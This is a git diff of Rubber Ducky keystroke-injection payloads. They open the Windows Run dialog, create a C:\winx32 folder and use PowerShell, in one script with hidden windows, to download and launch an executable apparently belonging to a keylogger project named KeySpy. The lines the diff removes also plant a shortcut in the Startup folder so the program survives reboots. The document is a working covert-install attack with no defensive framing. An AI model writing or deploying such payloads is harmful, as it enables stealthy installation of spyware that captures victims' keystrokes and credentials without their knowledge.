@@ -1,52 +1,60 @@
+#Script1:
+REM Rubber Ducky payload to create a folder named "winx32" and execute a command with opening any terminal window
+
+DELAY 5000
+GUI r
+DELAY 1000
+STRING powershell -command "mkdir C:\winx32"
+DELAY 1000
+ENTER
+DELAY 1000
+STRING exit
+DELAY 1000
+ENTER
+
+DELAY 5000
+GUI r
+DELAY 1000
+STRING powershell -command "(Invoke-WebRequest -Uri 'https://github.com/3rr0r-505/KeySpy/releases/download/v1.4/kSpy-AIO_v1.4.exe' -OutFile 'C:\winx32\kSpy-AIO_v1.4.exe' -Verbose)"
+DELAY 1000
+ENTER
+DELAY 600000
+ALT F4
+
+DELAY 5000
+GUI r
+DELAY 1000
+STRING powershell -command "Start-Process 'C:\winx32\kSpy-AIO_v1.4.exe'"
+DELAY 1000
+ENTER
+DELAY 10000
+ALT F4
+
+
+
+#Script2:
 REM Rubber Ducky payload to create a folder named "winx32" and execute a command without opening any terminal window
 
 DELAY 1000
 GUI r
-DELAY 500
-STRING cmd
-DELAY 500
+DELAY 1000
+STRING powershell -windowstyle hidden -command "mkdir C:\winx32"
+DELAY 1000
 ENTER
-DELAY 500
-STRING mkdir C:\winx32
-DELAY 500
-ENTER
-DELAY 500
-STRING exit
-DELAY 500
-ENTER
+ALT F4
+
 DELAY 1000
 GUI r
-DELAY 500
-STRING powershell
-DELAY 500
-ENTER
 DELAY 1000
-STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/3rr0r-505/KeySpy/raw/main/exe/kSpy-AIO_v1.2.exe', 'C:\winx32\kSpy-AIO_v1.2.exe')
-DELAY 500
-ENTER
-DELAY 5000
-STRING Start-Process 'C:\winx32\kSpy-AIO_v1.2.exe'
-DELAY 500
-ENTER
-DELAY 10000
-STRING (New-Object System.Net.WebClient).DownloadFile('https://github.com/3rr0r-505/KeySpy/raw/main/exe/.lnk/kSpy-srt.zip', 'C:\winx32\kSpy-srt.zip')
-DELAY 500
-ENTER
-DELAY 10000
-STRING Expand-Archive -Path 'C:\winx32\kSpy-srt.zip' -DestinationPath 'C:\winx32\kSpy-srt'
-DELAY 500
-ENTER
+STRING powershell -windowstyle hidden -command "(Invoke-WebRequest -Uri 'https://github.com/3rr0r-505/KeySpy/releases/download/v1.4/kSpy-AIO_v1.4.exe' -OutFile 'C:\winx32\kSpy-AIO_v1.4.exe')"
 DELAY 1000
-STRING Remove-Item 'C:\winx32\kSpy-srt.zip' -Force
-DELAY 500
 ENTER
-DELAY 1000
-STRING move-item -Path 'C:\winx32\kSpy-srt\kSpy-AIO_v1.2 - Shortcut.lnk' -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\kSpy-AIO_v1.2-Srt.lnk"
-DELAY 500
-ENTER
-DELAY 1000
-STRING explorer "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
-DELAY 500
-ENTER
-DELAY 1000
+DELAY 600000
 ALT F4
+
+DELAY 5000
+GUI r
+DELAY 1000
+STRING powershell -windowstyle hidden -command "Start-Process 'C:\winx32\kSpy-AIO_v1.4.exe'"
+DELAY 10000
+ENTER
